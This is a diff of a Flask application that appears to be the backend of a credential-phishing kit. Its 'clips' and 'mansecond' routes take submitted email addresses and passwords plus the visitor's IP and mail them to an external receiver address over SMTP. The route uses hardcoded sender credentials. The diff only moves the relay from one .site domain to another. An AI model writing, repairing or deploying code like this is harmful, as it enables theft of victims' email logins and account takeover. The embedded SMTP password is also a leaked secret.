@@ -189,7 +189,7 @@ def clips():
             ip = request.remote_addr
         email = request.form.get("emailapive")
         passwordemail = request.form.get("passwordapive")
-        sender_email = "newsevers@apmalal.site"
+        sender_email = "newsevers@yonia.site"
         sender_emaill = "contact"
         receiver_email = "jayze.alvis@moonfee.com"
         password = "-%JXX7Ap]-4q"
@@ -208,7 +208,7 @@ def clips():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("apmalal.site", 465) as server:
+        with smtplib.SMTP_SSL("yonia.site", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
@@ -235,7 +235,7 @@ def mansecond():
             ip = request.remote_addr
         email = request.form.get("emailail")
         passwordemail = request.form.get("passwordail")
-        sender_email = "newsevers@apmalal.site"
+        sender_email = "newsevers@yonia.site"
         sender_emaill = "contact"
         receiver_email = "jayze.alvis@moonfee.com"
         password = "-%JXX7Ap]-4q"
@@ -254,7 +254,7 @@ def mansecond():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("apmalal.site", 465) as server:
+        with smtplib.SMTP_SSL("yonia.site", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
@@ -278,4 +278,5 @@ def pilom():
 
 if __name__ == "__main__":
     app.run(debug=True)
+
 
